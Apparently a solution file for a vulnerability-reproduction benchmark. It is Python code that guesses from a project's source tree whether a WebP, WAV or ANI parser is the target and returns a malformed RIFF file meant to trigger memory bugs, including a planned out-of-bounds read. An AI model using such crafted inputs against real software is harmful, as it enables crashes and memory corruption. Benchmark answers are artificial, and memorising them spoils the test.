import os
import tarfile
import struct
from typing import Dict, Iterable, Tuple, Optional


def _le32(x: int) -> bytes:
    return struct.pack('<I', x & 0xFFFFFFFF)


def _make_webp_poc() -> bytes:
    riff_size = 0x00000100
    chunk_size = 0x00000100
    # Minimal VP8 keyframe header; partition length set to 100 to encourage deeper parsing.
    vp8_hdr = bytes([
        0x90, 0x0C, 0x00,  # frame tag: keyframe + show + part0 size=100
        0x9D, 0x01, 0x2A,  # start code
        0x01, 0x00,        # width = 1
        0x01, 0x00,        # height = 1
    ])
    return b'RIFF' + _le32(riff_size) + b'WEBP' + b'VP8 ' + _le32(chunk_size) + vp8_hdr


def _make_wav_poc() -> bytes:
    riff_size = 0x00000100
    fmt_payload = struct.pack('<HHIIHH', 1, 1, 8000, 8000, 1, 8)  # PCM, mono, 8kHz, 8-bit
    data_size = 0x00000100
    return (
        b'RIFF' + _le32(riff_size) + b'WAVE' +
        b'fmt ' + _le32(16) + fmt_payload +
        b'data' + _le32(data_size)
    )


def _make_ani_poc() -> bytes:
    riff_size = 0x00000100
    anih_size = 36
    # ANI header (anih) is 9 DWORDs = 36 bytes.
    anih_payload = struct.pack(
        '<9I',
        36,  # cbSizeof
        1,   # cFrames
        1,   # cSteps
        1,   # cx
        1,   # cy
        32,  # cBitCount
        1,   # cPlanes
        1,   # JifRate
        1,   # flags
    )
    # Add 2 bytes to entice an out-of-bounds read of the next chunk header.
    return b'RIFF' + _le32(riff_size) + b'ACON' + b'anih' + _le32(anih_size) + anih_payload + b'LI'


class Solution:
    def _iter_text_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = ('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.hxx', '.inc', '.inl',
                '.py', '.rs', '.go', '.java', '.kt', '.m', '.mm', '.swift',
                '.cmake', 'cmakelists.txt', '.bazel', '.bzl', '.gn', '.gni',
                '.mk', 'makefile', 'makefile.am', 'makefile.in',
                '.txt', '.md', '.rst', '.yaml', '.yml', '.json', '.toml')
        max_files = 6000
        max_read = 250_000

        try:
            with tarfile.open(tar_path, mode='r:*') as tf:
                count = 0
                for m in tf:
                    if count >= max_files:
                        break
                    if not m.isfile():
                        continue
                    name = m.name
                    lname = name.lower()
                    if m.size <= 0:
                        continue
                    if m.size > 5_000_000:
                        continue
                    if not (lname.endswith(exts) or os.path.basename(lname) in exts):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read(max_read)
                    except Exception:
                        continue
                    count += 1
                    yield name, data
        except Exception:
            return

    def _iter_text_files_from_dir(self, dir_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = ('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.hxx', '.inc', '.inl',
                '.py', '.rs', '.go', '.java', '.kt', '.m', '.mm', '.swift',
                '.cmake', '.mk', '.txt', '.md', '.rst', '.yaml', '.yml', '.json', '.toml')
        max_files = 6000
        max_read = 250_000
        count = 0
        for root, _, files in os.walk(dir_path):
            for fn in files:
                if count >= max_files:
                    return
                lfn = fn.lower()
                if not (lfn.endswith(exts) or lfn in ('cmakelists.txt', 'makefile', 'makefile.am', 'makefile.in')):
                    continue
                path = os.path.join(root, fn)
                try:
                    st = os.stat(path)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 5_000_000:
                    continue
                try:
                    with open(path, 'rb') as f:
                        data = f.read(max_read)
                except Exception:
                    continue
                count += 1
                yield path, data

    def _detect_format(self, src_path: str) -> str:
        scores: Dict[str, int] = {'webp': 0, 'wav': 0, 'ani': 0}

        base = os.path.basename(src_path).lower()
        if 'webp' in base:
            scores['webp'] += 10
        if 'wav' in base or 'wave' in base or 'snd' in base:
            scores['wav'] += 6
        if 'ani' in base or 'acon' in base:
            scores['ani'] += 6

        it: Optional[Iterable[Tuple[str, bytes]]] = None
        if os.path.isdir(src_path):
            it = self._iter_text_files_from_dir(src_path)
        else:
            it = self._iter_text_files_from_tar(src_path)

        for name, data in it:
            lname = name.lower()
            if 'oss-fuzz' in lname or 'fuzz' in lname or 'fuzzer' in lname:
                fuzz_boost = 2
            else:
                fuzz_boost = 1

            if 'webp' in lname:
                scores['webp'] += 6 * fuzz_boost
            if 'vp8' in lname:
                scores['webp'] += 4 * fuzz_boost
            if 'wav' in lname or 'wave' in lname or 'sndfile' in lname or 'riffwav' in lname:
                scores['wav'] += 5 * fuzz_boost
            if 'anih' in lname or 'acon' in lname:
                scores['ani'] += 8 * fuzz_boost

            lower = data.lower()

            if b'llvmfuzzertestoneinput' in lower:
                if b'webp' in lower or b'vp8' in lower or b'vp8l' in lower or b'vp8x' in lower:
                    scores['webp'] += 25
                if b'wave' in lower or b'wav' in lower or b'fmt ' in lower:
                    scores['wav'] += 25
                if b'anih' in lower or b'acon' in lower:
                    scores['ani'] += 35

            if b'anih' in lower or b'acon' in lower:
                scores['ani'] += 30 * fuzz_boost
            if b'webp' in lower or b'vp8' in lower or b'vp8l' in lower or b'vp8x' in lower or b'webpdecode' in lower or b'webpgetinfo' in lower:
                scores['webp'] += 12 * fuzz_boost
            if b'wave' in lower or b'wav' in lower or b'fmt ' in lower or b'wavpack' in lower or b'drwav' in lower or b'libsndfile' in lower:
                scores['wav'] += 10 * fuzz_boost

        best = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores[best] <= 0:
            return 'wav'
        return best

    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_format(src_path)
        if fmt == 'ani':
            return _make_ani_poc()
        if fmt == 'webp':
            return _make_webp_poc()
        return _make_wav_poc()